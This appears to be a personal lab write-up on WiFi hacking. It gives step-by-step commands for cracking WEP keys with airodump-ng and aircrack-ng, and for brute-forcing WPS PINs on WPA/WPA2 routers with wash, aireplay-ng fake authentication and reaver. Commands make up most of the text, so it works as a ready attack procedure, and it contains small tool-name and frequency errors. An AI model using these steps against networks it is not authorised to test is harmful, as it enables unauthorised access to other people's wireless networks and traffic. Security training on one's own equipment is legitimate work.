# Network Hacking (wifi)

## Objective
Network Hacking and gaining access to Wifi networks and cracking them.

### Skills Learned

- Sniffing on 5Gz and 2.5Gz wireless networks
- aircrack-ng
  

### Tools Used

- Kali Linux.
- VMware Fusion.
- airodump-ng
- aircrack-ng
- WASH
- aireplay-ng

## Steps for WAP

- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

(The mode will be Monitor now)

- Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
```bash
airdump-ng --band abg wlan0
```

- Sniffing packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
```bash
airodump-ng --bssid 03:DE:4B:AD:CC:8B --channel 9 --write test mon0
```

- Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
- Use aircrack-ng to find the Key from the file we created ending with .cap
```bash
aircrack-ng test.cap
```
- Copy the key and remove the : and that would be the wifi password.

## Steps for WPA/WPA2

- Changing the wireless USB mode to monitoring
```bash
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
- Find wifi networks with WPS enebled using the tool WASH
```bash
wash --interface wlan0
```
- Use aireplay-ng to create a fake authentication with te first MAC address is the target and the second is the USB wireless adapter MAC address, which is the first 12 characters from the ifconfig, make sure to replace the "-" with the ":".
```bash
aireplay-ng --fakeauth 30 -a 78:67:0E:31:4C:42 -h 3A:97:5F:E2:18:5F wlan0
```
- Don't execute the code above yet. We go to the second terminal and use reaver tool to bruteforce and get the pin.
```bash
reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associate
```
- If Reaver finds the pin then the password will be available for the Wifi network. 
(not all routers will be cracked with these steps)

￼
